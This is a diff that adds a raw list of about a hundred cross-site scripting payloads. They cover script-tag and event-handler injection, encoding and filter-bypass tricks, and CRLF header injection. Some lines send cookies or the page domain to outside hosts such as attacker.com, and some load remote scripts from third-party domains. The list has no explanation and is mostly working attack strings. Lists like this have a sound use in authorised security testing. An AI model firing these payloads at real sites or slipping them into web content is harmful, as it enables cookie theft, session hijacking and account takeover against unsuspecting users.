@@ -1,0 +1,100 @@
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+"><script src="//1k0.pw/x"></script>
+test"><Img Src="//X55.is/> "OnError=import(src)//
+"><img src=x onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+{{2*2}}'\"><s>n0nce<img/src=x onerror=alert(document.domain)>
+%0d%0a%0d%0a<script>alert(5)></script>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<svg/onload=confirm(1)>
+<img src=x oNeRrOr=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+" onmouseover=alert(1) x="
+' onfocus=alert(1) autofocus '
+"><img src=x onerror=alert(document.domain)>
+"onpointerenter=alert(document.domain)+
+%3F%3f%0D%0AX-XSS-Protection%3a0%0D%0AContent-Encoding:%20utf-8%0D%0A%0D%0A28%0D%0A<script>alert(document.domain)</script>%0D%0A0%0D%0A%0D%0A
+"><svg on onload=(alert)(1)>
+"><svg on onload=(alert)(document.domain)>
+<svg onx=() onload=(confirm)(1)>
+<img ignored=() src=x onerror=prompt(1)>
+<object data=javascript:confirm()>
+<Img Src="javascript:alert(1)> 1"OnError=location=src//
+<svg/on/oNloaD=alert``>
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+1"><meta http-equiv="refresh" content="0; url=//gurelahmet.com?
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<a"/onclick=(confirm)()>Click Here!
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+javascript:{ alert`0` }
+1'"><img/src/onerror=.1|alert''>
+<img src=x onError=import('//1152848220/')>
+%2sscript%2ualert()%2s/script%2u
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain)
+<svg/onload=location/**/='https://your.server/'+document.domain>
+<svg onx=() onload=window.alert?.()>
+test",prompt%0A/*HelloWorld*/(document.domain)
+"onx=() onmouseover=prompt(1)>
+" onxXxxXXxXXXxx=() autofocus onmouseover=prompt(1)>
+"onx={} onmouseover=prompt(1)>
+"onx=[] onmouseover=prompt(1)>
+" onx={} onfocus=prompt(1)><! --
+<svg asd onload=confirm(1)>
+1"><img src=x onmouseover=prompt&#00000000000000000040;document.cookie&#00000000000000000041;
+1"><img src="http://xss.cx/xss.svg onmouseover=prompt&#00000000000000000040;document.cookie&#00000000000000000041;
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<img alt="<x" title="/><img src=x onerror=alert(6)>">
+<script src='//㉛.ﬆ'>
+<svg/onload=import('//㉛.ﬆ')>
+<img src=x onerror=alert`1`>
+<svg/onload=confirm?.(1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.cookie)>
+<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+<svg><set onbegin=alert(1) attributeName=x></svg>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=setTimeout('alert(1)')>
+<img src=x onerror=setInterval('alert(1)',1000)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=window.location='javascript:alert(1)'>
+<svg/onload=location='javascript:alert(1)'>
+<img src=x onerror=alert&#40;1&#41;>
+<a href=javascript:alert&#40;1&#41;>x</a>
+<img src=x onerror=String.fromCharCode(97,108,101,114,116)(1)>
+<svg/onload=String.fromCharCode(97,108,101,114,116)(1)>
+<img src=x onerror=alert.call(this,1)>
+<img src=x onerror=alert.apply(this,[1])>
+<img src=x onerror=top.alert(1)>
+<img src=x onerror=parent.alert(1)>
+<img src=x onerror=self.alert(1)>
+<img src=x onerror=frames[0].alert(1)>
+<img src=x onerror=this['alert'](1)>
+<svg/onload=this['alert'](1)>
+<img src=x onerror=(()=>alert(1))()>
+<img src=x onerror=(function(){alert(1)})()>
+<iframe src="http://xss.cx/xss.svg"></iframe>
+<img src="http://xss.cx/xss.svg" alt="Test" width="500" height="600">
+<img src="https://img.freepik.com/free-vector/hacker-team-esport-logo_177315-79.jpg" alt="Test" width="500" height="600">
